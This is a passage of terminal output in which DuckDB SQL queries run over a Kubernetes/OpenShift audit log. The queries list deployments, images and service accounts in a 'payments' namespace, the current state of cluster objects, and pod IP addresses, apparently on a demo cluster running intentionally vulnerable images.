\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u279c  ~ duckdb -c \" SELECT   json_extract(responseObject, '$.metadata') AS Metadata FROM read_json_auto('audit.log', ignore_errors=true) WHERE json_extract_string(objectRef, '$.namespace') = 'payments'   AND json_extract_string(objectRef, '$.resource') = 'deployments'   AND json_extract_string(objectRef, '$.name') = 'gateway'   AND verb = 'create'; \" \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502                                                                                            Metadata                                                                                             \u2502 \u2502                                                                                              json                                                                                               \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 {\"name\":\"gateway\",\"namespace\":\"payments\",\"uid\":\"ccd7ab4c-b4f9-4c05-ac24-bacbbf13fa90\",\"resourceVersion\":\"11632574\",\"creationTimestamp\":\"2025-12-10 06:30:37\",\"labels\":{\"app\":\"gateway\",\"app.k\u2026  \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u279c  ~ duckdb -c \" SELECT   json_extract_string(objectRef, '$.name') AS Deployment,   json_extract_string(responseObject, '$.spec.template.spec.containers[0].image') AS Image,   COALESCE(json_extract_string(responseObject, '$.spec.template.spec.serviceAccountName'), 'default') AS ServiceAccount FROM read_json_auto('audit.log', ignore_errors=true) WHERE json_extract_string(objectRef, '$.namespace') = 'payments'   AND json_extract_string(objectRef, '$.resource') = 'deployments'   AND verb = 'create' ORDER BY requestReceivedTimestamp; \" \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502      Deployment      \u2502                  Image                   \u2502    ServiceAccount    \u2502 \u2502       varchar        \u2502                 varchar                  \u2502       varchar        \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 gateway              \u2502 quay.io/vuln/gateway:v1                  \u2502 default              \u2502 \u2502 mastercard-processor \u2502 quay.io/vuln/mastercard-processor:latest \u2502 mastercard-processor \u2502 \u2502 visa-processor       \u2502 quay.io/vuln/visa-processor:latest       \u2502 visa-processor       \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u279c  ~ </p> <p>\u279c  ~ duckdb -c \" WITH history AS (     SELECT         requestReceivedTimestamp as ts,         verb,         json_extract_string(objectRef, '$.namespace') as ns,         json_extract_string(objectRef, '$.resource') as kind,         json_extract_string(objectRef, '$.name') as name,         -- Find the latest event for every unique object (Namespace + Kind + Name)         ROW_NUMBER() OVER (             PARTITION BY                 json_extract_string(objectRef, '$.namespace'),                 json_extract_string(objectRef, '$.resource'),                 json_extract_string(objectRef, '$.name')             ORDER BY requestReceivedTimestamp DESC         ) as rn     FROM read_json_auto('audit.log', ignore_errors=true)     WHERE json_extract_string(objectRef, '$.resource') IN (           'pods', 'services', 'configmaps', 'serviceaccounts', 'namespaces', 'nodes', 'secrets',           'persistentvolumes', 'persistentvolumeclaims', 'deployments', 'daemonsets', 'statefulsets',           'replicasets', 'jobs', 'cronjobs', 'ingresses', 'routes', 'networkpolicies',           'virtualmachines', 'virtualmachineinstances'           )       AND verb IN ('create', 'update', 'patch', 'delete') ) SELECT     ns AS Namespace,     kind AS Kind,     name AS Name,     ts AS LastUpdated FROM history WHERE rn = 1   AND verb != 'delete'  -- Exclude objects that were deleted   AND Name IS NOT NULL  -- Exclude malformed log entries ORDER BY ns, kind, name; \" \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502   Namespace    \u2502      Kind       \u2502                Name                 \u2502         LastUpdated         \u2502 \u2502    varchar     \u2502     varchar     \u2502               varchar               \u2502           varchar           \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 backend        \u2502 configmaps      \u2502 checkout-endpoint-config            \u2502 2025-12-10T06:29:50.888226Z \u2502 \u2502 backend        \u2502 configmaps      \u2502 config-service-cabundle             \u2502 2025-12-10T06:29:46.435614Z \u2502 \u2502 backend        \u2502 configmaps      \u2502 config-trusted-cabundle             \u2502 2025-12-10T06:29:46.430860Z \u2502 \u2502 backend        \u2502 configmaps      \u2502 kube-root-ca.crt                    \u2502 2025-12-10T06:29:45.852862Z \u2502 \u2502 backend        \u2502 configmaps      \u2502 openshift-service-ca.crt            \u2502 2025-12-10T06:29:45.889466Z \u2502 \u2502 backend        \u2502 configmaps      \u2502 recommendation-endpoint-config      \u2502 2025-12-10T06:29:51.377209Z \u2502 \u2502 backend        \u2502 configmaps      \u2502 reports-endpoint-config             \u2502 2025-12-10T06:29:51.876048Z \u2502 \u2502 backend        \u2502 deployments     \u2502 catalog                             \u2502 2025-12-10T06:30:07.439014Z \u2502 \u2502 backend        \u2502 deployments     \u2502 checkout                            \u2502 2025-12-10T06:30:12.510642Z \u2502 \u2502 backend        \u2502 deployments     \u2502 notification                        \u2502 2025-12-10T06:30:15.516189Z \u2502 \u2502 backend        \u2502 deployments     \u2502 recommendation                      \u2502 2025-12-10T06:30:18.543918Z \u2502 \u2502 backend        \u2502 deployments     \u2502 reports                             \u2502 2025-12-10T06:30:21.564426Z \u2502 \u2502 backend        \u2502 deployments     \u2502 shipping                            \u2502 2025-12-10T06:30:25.615086Z \u2502 \u2502 backend        \u2502 namespaces      \u2502 backend                             \u2502 2025-12-10T06:29:46.437041Z \u2502 \u2502 backend        \u2502 pods            \u2502 catalog-6f458f4787-gvv42            \u2502 2025-12-10T06:30:05.280742Z \u2502 \u2502 backend        \u2502 pods            \u2502 checkout-d4f598d84-57pwx            \u2502 2025-12-10T06:30:08.971804Z \u2502 \u2502 backend        \u2502 pods            \u2502 notification-77477dc7ff-4kr6n       \u2502 2025-12-10T06:30:12.730477Z \u2502 \u2502 backend        \u2502 pods            \u2502 recommendation-7fb9bc97dc-k66tj     \u2502 2025-12-10T06:30:16.467920Z \u2502 \u2502 backend        \u2502 pods            \u2502 reports-5c477c86b7-cg947            \u2502 2025-12-10T06:30:19.672406Z \u2502 \u2502 backend        \u2502 pods            \u2502 shipping-56c9c9dd4f-26xzw           \u2502 2025-12-10T06:30:23.839068Z \u2502 \u2502    \u00b7           \u2502  \u00b7              \u2502          \u00b7                          \u2502              \u00b7              \u2502 \u2502    \u00b7           \u2502  \u00b7              \u2502          \u00b7                          \u2502              \u00b7              \u2502 \u2502    \u00b7           \u2502  \u00b7              \u2502          \u00b7                          \u2502              \u00b7              \u2502 \u2502 payments       \u2502 serviceaccounts \u2502 mastercard-processor                \u2502 2025-12-10T06:29:47.526509Z \u2502 \u2502 payments       \u2502 serviceaccounts \u2502 pipeline                            \u2502 2025-12-10T06:29:47.450458Z \u2502 \u2502 payments       \u2502 serviceaccounts \u2502 visa-processor                      \u2502 2025-12-10T06:29:48.084534Z \u2502 \u2502 payments       \u2502 services        \u2502 gateway-service                     \u2502 2025-12-10T06:29:58.028051Z \u2502 \u2502 payments       \u2502 services        \u2502 mastercard-processor-service        \u2502 2025-12-10T06:29:58.538021Z \u2502 \u2502 payments       \u2502 services        \u2502 visa-processor-service              \u2502 2025-12-10T06:29:59.053820Z \u2502 \u2502 rhacs-operator \u2502 secrets         \u2502 pipeline-dockercfg-66qz4            \u2502 2025-12-10T06:28:11.023468Z \u2502 \u2502 rhacs-operator \u2502 serviceaccounts \u2502 pipeline                            \u2502 2025-12-10T06:28:11.001486Z \u2502 \u2502 stackrox       \u2502 deployments     \u2502 scanner-v4-matcher                  \u2502 2025-12-10T06:31:07.119432Z \u2502 \u2502 stackrox       \u2502 pods            \u2502 scanner-v4-matcher-6d5bdd4dc8-zckqv \u2502 2025-12-10T06:31:04.024169Z \u2502 \u2502 stackrox       \u2502 replicasets     \u2502 scanner-v4-matcher-6d5bdd4dc8       \u2502 2025-12-10T06:31:07.102478Z \u2502 \u2502 stackrox       \u2502 secrets         \u2502 pipeline-dockercfg-4tbwh            \u2502 2025-12-10T06:28:13.023658Z \u2502 \u2502 stackrox       \u2502 serviceaccounts \u2502 pipeline                            \u2502 2025-12-10T06:28:13.002409Z \u2502 \u2502 NULL           \u2502 ingresses       \u2502 cluster                             \u2502 2025-12-10T06:30:32.899432Z \u2502 \u2502 NULL           \u2502 namespaces      \u2502 backend                             \u2502 2025-12-10T06:29:45.805882Z \u2502 \u2502 NULL           \u2502 namespaces      \u2502 frontend                            \u2502 2025-12-10T06:29:46.148817Z \u2502 \u2502 NULL           \u2502 namespaces      \u2502 payments                            \u2502 2025-12-10T06:29:46.493026Z \u2502 \u2502 NULL           \u2502 nodes           \u2502 master-0                            \u2502 2025-12-10T06:31:29.260508Z \u2502 \u2502 NULL           \u2502 nodes           \u2502 master-1                            \u2502 2025-12-10T06:31:32.322597Z \u2502 \u2502 NULL           \u2502 nodes           \u2502 master-2                            \u2502 2025-12-10T06:31:15.271081Z \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 248 rows (40 shown)                                                                        4 columns \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u279c  ~ duckdb -c \" WITH history AS (     SELECT         requestReceivedTimestamp as ts,         verb,         json_extract_string(objectRef, '$.namespace') as ns,         json_extract_string(objectRef, '$.resource') as kind,         json_extract_string(objectRef, '$.name') as name,         -- Find the latest event for every unique object (Namespace + Kind + Name)         ROW_NUMBER() OVER (             PARTITION BY                 json_extract_string(objectRef, '$.namespace'),                 json_extract_string(objectRef, '$.resource'),                 json_extract_string(objectRef, '$.name')             ORDER BY requestReceivedTimestamp DESC         ) as rn     FROM read_json_auto('audit.log', ignore_errors=true)     WHERE json_extract_string(objectRef, '$.resource') IN (           'pods', 'services', 'configmaps', 'serviceaccounts', 'namespaces', 'nodes', 'secrets',           'persistentvolumes', 'persistentvolumeclaims', 'deployments', 'daemonsets', 'statefulsets',           'replicasets', 'jobs', 'cronjobs', 'ingresses', 'routes', 'networkpolicies',           'virtualmachines', 'virtualmachineinstances'           )       AND verb IN ('create', 'update', 'patch', 'delete') ) SELECT     ns AS Namespace,     kind AS Kind,     name AS Name,     ts AS LastUpdated FROM history WHERE rn = 1   AND verb != 'delete'  -- Exclude objects that were deleted   AND Name IS NOT NULL  -- Exclude malformed log entries ORDER BY ns, kind, name; \"</p> <p>\u279c  ~ duckdb -c \"                                                                                WITH all_events AS (     SELECT         json_extract_string(objectRef, '$.namespace') as ns,         json_extract_string(objectRef, '$.name') as name,         requestReceivedTimestamp as ts,         verb,         -- Extract IP from either Status OR OpenShift Annotation         COALESCE(             json_extract_string(responseObject, '$.status.podIP'),             json_extract_string(                 json_extract_string(responseObject, '$.metadata.annotations.\\\"k8s.ovn.org/pod-networks\\\"'),                 '$.default.ip_address'             )         ) as extracted_ip     FROM read_json_auto('audit.log.new', ignore_errors=true)     WHERE json_extract_string(objectRef, '$.resource') = 'pods' ), -- 1. Get the current status of every pod (Active vs Deleted) active_pods AS (     SELECT DISTINCT ON (ns, name)         ns, name, verb     FROM all_events     WHERE name IS NOT NULL     ORDER BY ns, name, ts DESC ), -- 2. Get the last known IP for every pod (skipping NULLs) latest_ips AS (     SELECT DISTINCT ON (ns, name)         ns, name, extracted_ip as ip     FROM all_events     WHERE extracted_ip IS NOT NULL       AND name IS NOT NULL     ORDER BY ns, name, ts DESC ) -- 3. Combine them SELECT     p.ns AS Namespace,     p.name AS Pod,     i.ip AS IP FROM active_pods p LEFT JOIN latest_ips i ON p.ns = i.ns AND p.name = i.name WHERE p.verb != 'delete' ORDER BY p.ns, p.name; \" \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502              Namespace               \u2502                   Pod                   \u2502       IP        \u2502 \u2502               varchar                \u2502                 varchar                 \u2502     varchar     \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 backend                              \u2502 catalog-6f458f4787-gvv42                \u2502 10.130.0.181/23 \u2502 \u2502 backend                              \u2502 checkout-d4f598d84-57pwx                \u2502 10.130.0.182/23 \u2502 \u2502 backend                              \u2502 notification-77477dc7ff-4kr6n           \u2502 10.130.0.184/23 \u2502 \u2502 backend                              \u2502 recommendation-7fb9bc97dc-k66tj         \u2502 10.130.0.185/23 \u2502 \u2502 backend                              \u2502 reports-5c477c86b7-cg947                \u2502 10.130.0.186/23 \u2502 \u2502 backend                              \u2502 shipping-56c9c9dd4f-26xzw               \u2502 10.130.0.187/23 \u2502 \u2502 frontend                             \u2502 asset-cache-7d548fc66f-x4cmp            \u2502 10.128.1.202/23 \u2502 \u2502 frontend                             \u2502 blog-7776768bf6-lxhjp                   \u2502 10.128.1.203/23 \u2502 \u2502 frontend                             \u2502 webapp-7f77777944-9xs4h                 \u2502 10.130.0.188/23 \u2502 \u2502 openshift-authentication             \u2502 oauth-openshift-67cbf56478-6b6s6        \u2502 NULL            \u2502 \u2502 openshift-authentication             \u2502 oauth-openshift-67cbf56478-f2zqm        \u2502 NULL            \u2502 \u2502 openshift-authentication             \u2502 oauth-openshift-67cbf56478-h8mqr        \u2502 NULL            \u2502 \u2502 openshift-etcd                       \u2502 etcd-guard-master-0                     \u2502 NULL            \u2502 \u2502 openshift-etcd                       \u2502 etcd-guard-master-1                     \u2502 NULL            \u2502 \u2502 openshift-etcd                       \u2502 etcd-guard-master-2                     \u2502 NULL            \u2502 \u2502 openshift-etcd                       \u2502 etcd-master-0                           \u2502 NULL            \u2502 \u2502 openshift-etcd                       \u2502 etcd-master-1                           \u2502 NULL            \u2502 \u2502 openshift-etcd                       \u2502 etcd-master-2                           \u2502 NULL            \u2502 \u2502 openshift-kube-apiserver             \u2502 kube-apiserver-guard-master-0           \u2502 NULL            \u2502 \u2502 openshift-kube-apiserver             \u2502 kube-apiserver-guard-master-1           \u2502 NULL            \u2502 \u2502            \u00b7                         \u2502              \u00b7                          \u2502  \u00b7              \u2502 \u2502            \u00b7                         \u2502              \u00b7                          \u2502  \u00b7              \u2502 \u2502            \u00b7                         \u2502              \u00b7                          \u2502  \u00b7              \u2502 \u2502 openshift-kube-apiserver             \u2502 revision-pruner-16-master-0             \u2502 NULL            \u2502 \u2502 openshift-kube-apiserver             \u2502 revision-pruner-16-master-1             \u2502 NULL            \u2502 \u2502 openshift-kube-apiserver             \u2502 revision-pruner-16-master-2             \u2502 NULL            \u2502 \u2502 openshift-kube-controller-manager    \u2502 kube-controller-manager-guard-master-0  \u2502 NULL            \u2502 \u2502 openshift-kube-controller-manager    \u2502 kube-controller-manager-guard-master-1  \u2502 NULL            \u2502 \u2502 openshift-kube-controller-manager    \u2502 kube-controller-manager-guard-master-2  \u2502 NULL            \u2502 \u2502 openshift-kube-controller-manager    \u2502 kube-controller-manager-master-0        \u2502 NULL            \u2502 \u2502 openshift-kube-controller-manager    \u2502 kube-controller-manager-master-1        \u2502 NULL            \u2502 \u2502 openshift-kube-controller-manager    \u2502 kube-controller-manager-master-2        \u2502 NULL            \u2502 \u2502 openshift-kube-scheduler             \u2502 openshift-kube-scheduler-guard-master-0 \u2502 NULL            \u2502 \u2502 openshift-kube-scheduler             \u2502 openshift-kube-scheduler-guard-master-1 \u2502 NULL            \u2502 \u2502 openshift-kube-scheduler             \u2502 openshift-kube-scheduler-guard-master-2 \u2502 NULL            \u2502 \u2502 openshift-kube-scheduler             \u2502 openshift-kube-scheduler-master-0       \u2502 NULL            \u2502 \u2502 openshift-kube-scheduler             \u2502 openshift-kube-scheduler-master-1       \u2502 NULL            \u2502 \u2502 openshift-kube-scheduler             \u2502 openshift-kube-scheduler-master-2       \u2502 NULL            \u2502 \u2502 openshift-operator-lifecycle-manager \u2502 collect-profiles-29422470-vj4ds         \u2502 10.129.1.125/23 \u2502 \u2502 payments                             \u2502 gateway-79d69c8875-69zn9                \u2502 10.130.0.189/23 \u2502 \u2502 payments                             \u2502 mastercard-processor-59986f994c-lmwmx   \u2502 10.130.0.190/23 \u2502 \u2502 payments                             \u2502 visa-processor-7d57964dc8-brrf7         \u2502 10.130.0.191/23 \u2502 \u2502 stackrox                             \u2502 scanner-v4-matcher-6d5bdd4dc8-zckqv     \u2502 10.128.1.204/23 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 44 rows (40 shown)                                                                     3 columns \u2502 